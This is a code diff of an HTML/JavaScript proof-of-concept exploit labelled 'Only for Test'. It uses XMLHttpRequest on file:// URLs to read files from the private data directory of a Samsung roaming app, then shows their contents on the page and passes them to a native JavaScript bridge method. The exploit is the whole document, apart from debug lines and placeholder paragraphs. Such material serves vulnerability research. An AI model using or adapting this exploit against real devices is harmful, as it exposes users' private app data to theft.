@@ -4,6 +4,7 @@
 
 function sendGetRequest(url, filename, callback) {
     var xhr = new XMLHttpRequest();
+    console.log('xhr: ' + xhr);
     xhr.open('GET', url, false);
     xhr.send();
     callback(filename, xhr.responseText);
@@ -21,8 +22,13 @@ var base_path = 'file:///data/data/com.samsung.android.globalroaming/';
 
 for(var each in files) {
     var file_path = base_path + files[each];
+    var idx = Number(each) + 1;
+    console.log("p"+idx);
+    console.log('file_path: ' + file_path);
     var callback = function(filename, response) {
-        alert(filename + ":\n\n" + response);
+        alert(filename + ":\n\n" + response);        
+        document.getElementById("p"+idx).innerHTML=response;
+        secCallbackInterface.tapPreOrderProduct(response);
     }
     sendGetRequest(file_path, files[each], callback);
 }
@@ -33,5 +39,11 @@ for(var each in files) {
 <body>
 <h2>PoC file: Only for Test</h2>
 <p>Note: Do Not Use this file for any other illegal purpose except study or test.</p>
+
+<p id="p1">Hello World!</p>
+<p id="p2">Hello World!</p>
+<p id="p3">Hello World!</p>
+<p id="p4">Hello World!</p>
+<p id="p5">Hello World!</p>
 </body>
 </html>
